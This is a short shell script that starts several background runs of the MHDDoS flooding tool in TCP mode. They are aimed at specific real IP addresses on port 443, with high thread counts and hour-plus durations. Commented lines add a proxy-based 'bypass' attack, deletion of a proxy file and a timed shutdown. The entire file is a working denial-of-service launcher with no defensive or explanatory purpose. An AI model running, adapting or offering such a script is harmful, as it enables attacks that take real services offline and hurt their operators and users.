#!/bin/sh
#rm /home/ubuntu/mhddos/files/proxies/socks5.txt;
#python3 /home/ubuntu/mhddos/start.py bypass 176.67.241.93:443 5 1000 socks5.txt 100000 3600 &

python3 /home/ubuntu/mhddos/start.py tcp 185.79.118.6:443 400 6200 &
python3 /home/ubuntu/mhddos/start.py tcp 185.79.118.2:443 300 6200 &
python3 /home/ubuntu/mhddos/start.py tcp 185.178.208.163:443 300 6200 &
#python3 /home/ubuntu/mhddos/start.py tcp 185.46.11.253:443 100 6200 &

#sudo shutdown -P +62&
